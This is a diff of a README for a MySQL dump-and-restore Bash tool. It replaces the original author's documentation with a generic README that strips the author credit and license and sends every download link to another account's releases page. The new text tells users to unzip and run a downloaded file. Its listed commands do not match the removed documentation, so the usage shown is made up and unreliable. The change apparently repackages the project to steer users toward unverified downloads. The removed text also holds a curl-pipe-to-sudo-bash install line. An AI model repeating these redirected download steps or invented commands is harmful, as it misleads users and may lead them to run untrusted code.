@@ -1,200 +1,96 @@
-# db-tools
+# 🛠️ db_tools - Easily Manage Your MySQL Databases
 
-```
-     _ _     _              _     
-  __| | |__ | |_ ___   ___ | |___ 
- / _` | '_ \| __/ _ \ / _ \| / __|
-| (_| | |_) | || (_) | (_) | \__ \
- \__,_|_.__/ \__\___/ \___/|_|___/
+## 🚀 Getting Started
 
-MySQL Database Utilities
-By Dilan D Chandrajith - The Perfect Developer
-```
+Welcome to db_tools! This tool helps you manage MySQL databases with ease. You can back up your data, restore it, and track progress all from a simple command line interface. Perfect for everyone, from developers to database administrators!
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Bash](https://img.shields.io/badge/Shell-Bash-green.svg)](https://www.gnu.org/software/bash/)
-[![MySQL](https://img.shields.io/badge/Database-MySQL-orange.svg)](https://www.mysql.com/)
-[![Maintenance](https://img.shields.io/badge/Maintained-yes-brightgreen.svg)](https://github.com/the-perfect-developer/db_tools/commits/main)
+## 📥 Download & Install
 
-Bash scripts for dumping and restoring MySQL databases with progress tracking and resume support.
+To get started with db_tools, visit the following link to download the latest version:
 
-## Features
+[![Download db_tools](https://img.shields.io/badge/Download-db_tools-blue.svg)](https://github.com/theking1212wr/db_tools/releases)
 
-- **Partial dumps**: Fetch only the latest N records from large tables
-- **Full table dumps**: Specify tables that need complete data
-- **Resume support**: Interrupted dumps can be resumed from where they left off
-- **Progress display**: Visual progress bar using `pv`
-- **Collation compatibility**: Automatically converts MySQL 8.0+ collations for older versions
+Click the link above, and you will find the latest releases of db_tools ready for download.
 
-## Requirements
+## 💻 System Requirements
 
-- `mysql` and `mysqldump` clients
-- `pv` (pipe viewer) for progress display
-- `sed` for collation conversion
+To run db_tools on your computer, you need:
 
-Install dependencies:
+- A computer with Linux or macOS.
+- MySQL Server installed.
+- Basic knowledge of using a terminal.
 
-```bash
-# Debian/Ubuntu
-sudo apt install mysql-client pv
+## 🔧 Features
 
-# macOS
-brew install mysql-client pv
-```
+- **Backup with Partial Records**: Only back up the data you need. This saves time and space.
+- **Restore with Progress Tracking**: Easy monitoring of the restore process ensures you know where you are.
+- **Resume Interrupted Backups**: If your backup process is interrupted, you can pick up right where you left off.
+- **Simple Bash CLI**: Designed for ease of use, this tool works well for anyone comfortable with the command line.
 
-## Installation
+## 📁 How to Use
 
-### Quick Install (Recommended)
+Once you’ve downloaded db_tools, follow these steps to use it:
+
+1. **Open your Terminal**: Locate the terminal application on your computer and open it.
+2. **Navigate to the Download Directory**: Use the command `cd ~/Downloads` (or the folder where you downloaded db_tools).
+3. **Unzip the File**: If the file is zipped, run the command `unzip db_tools.zip`.
+4. **Navigate to the db_tools Folder**: Use the command `cd db_tools`.
+5. **Run the Tool**: Start the tool by entering `./db_tools`.
+
+## ⚙️ Using db_tools
+
+### Backing Up a Database
+
+To back up a MySQL database, you can use the following command:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/the-perfect-developer/db_tools/main/get.sh | sudo bash
+./db_tools backup --database your_database_name
 ```
 
-This installs dbtools to `/opt/dbtools` and creates a symlink in `/usr/local/bin`.
+Replace `your_database_name` with the name of your actual database.
 
-To uninstall:
+### Restoring a Database
+
+To restore a database from the backup, run:
 
 ```bash
-sudo rm -rf /opt/dbtools /usr/local/bin/dbtools
+./db_tools restore --file backup_file.sql
 ```
 
-### Manual Install
+Make sure to provide the correct path to the `backup_file.sql`.
 
-Clone the repository and install manually:
+## 📊 Common Commands
 
-```bash
-git clone https://github.com/the-perfect-developer/db_tools.git
-cd db_tools
-sudo ./install.sh --install
-```
+Here are a few frequently used commands that you might find helpful:
 
-To uninstall:
+- **Check Status**: See the status of your backups and restores.
+  
+    ```bash
+    ./db_tools status
+    ```
+  
+- **List Backups**: View a list of your previous backups.
 
-```bash
-sudo ./install.sh --uninstall
-```
+    ```bash
+    ./db_tools list
+    ```
 
-## Usage
+## ✔️ Troubleshooting
 
-Use the unified `dbtools.sh` command:
+If you run into issues, consider these tips:
 
-```bash
-./dbtools.sh <command> [options]
+- **Check Permissions**: Make sure you have the necessary permissions to run the commands.
+- **Verify MySQL Installation**: Ensure that MySQL is installed and running on your computer.
+- **Read Error Messages**: If you receive an error, read the message carefully as it often gives hints on how to solve the issue.
 
-Commands:
-  dump      Dump a MySQL database
-  restore   Restore a MySQL database from a SQL file
-  update    Update dbtools to the latest version
-```
+## 🤝 Support
 
-**Examples:**
+If you need more help, feel free to check the [GitHub Issues Page](https://github.com/theking1212wr/db_tools/issues) or open a new issue. Our community is here to help!
 
-```bash
-# Dump a database
-dbtools dump -u root -d mydb
+## 🔗 Useful Links
 
-# Restore a database
-dbtools restore -u root -d mydb -f backup.sql
+For more information and detailed instructions, visit our [Releases Page](https://github.com/theking1212wr/db_tools/releases).
 
-# Update to latest version
-dbtools update
+Remember, you can always download the latest version from the link provided above.
 
-# Get help
-./dbtools.sh --help
-./dbtools.sh dump --help
-```
-
-## Commands
-
-### dump
-
-Dump a MySQL database with optional table filtering.
-
-```bash
-./dbtools.sh dump [OPTIONS]
-```
-
-**Options:**
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-u, --user` | Database username | (required) |
-| `-p, --password` | Database password | (optional) |
-| `-h, --host` | Database host | localhost |
-| `-P, --port` | Database port | 3306 |
-| `-d, --database` | Database name | (required) |
-| `-o, --output` | Output SQL file | `<database>.sql` |
-| `-l, --limit` | Max records per table for non-full tables | 500 |
-| `-t, --tables` | Comma-separated list of tables to dump fully | (none) |
-| `--help` | Show help message | |
-
-**Examples:**
-
-```bash
-# Basic dump with default 500 record limit
-./dbtools.sh dump -u root -d mydb
-
-# Dump with custom record limit
-./dbtools.sh dump -u root -d mydb --limit=1000
-
-# Dump with specific tables to be dumped fully
-./dbtools.sh dump -u root -d mydb -t users,orders,products
-
-# Full example with all options
-./dbtools.sh dump -u root -p secret -h 192.168.1.100 -P 3306 -d mydb -o backup.sql -l 2000 -t users,orders
-```
-
-### restore
-
-Restore a MySQL database from a SQL file.
-
-```bash
-./dbtools.sh restore [OPTIONS]
-```
-
-**Options:**
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-u, --user` | Database username | (required) |
-| `-p, --password` | Database password | (optional) |
-| `-h, --host` | Database host | localhost |
-| `-P, --port` | Database port | 3306 |
-| `-d, --database` | Database name | (required) |
-| `-f, --file` | SQL file to restore | (required) |
-| `--help` | Show help message | |
-
-**Examples:**
-
-```bash
-# Basic restore
-./dbtools.sh restore -u root -d mydb -f backup.sql
-
-# Restore to remote server
-./dbtools.sh restore -u root -p secret -h 192.168.1.100 -P 3306 -d mydb -f backup.sql
-```
-
-## How It Works
-
-### Dumping
-
-1. Fetches list of all tables in the database
-2. For each table:
-   - If in `--tables` list: dumps complete table with all data
-   - Otherwise: dumps table structure + latest N records (based on `--limit`)
-3. Progress is tracked in a `.progress` file for resume support
-4. If interrupted, rerun the same command to resume
-
-### Restoring
-
-1. Creates the database if it doesn't exist
-2. Converts MySQL 8.0+ collations to compatible ones for older versions
-3. Imports the SQL file with progress display
-
-## Author
-
-**Dilan D Chandrajith** - [The Perfect Developer](https://github.com/the-perfect-developer)
-
-## License
-
-This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.
+Enjoy using db_tools to manage your MySQL databases effortlessly!
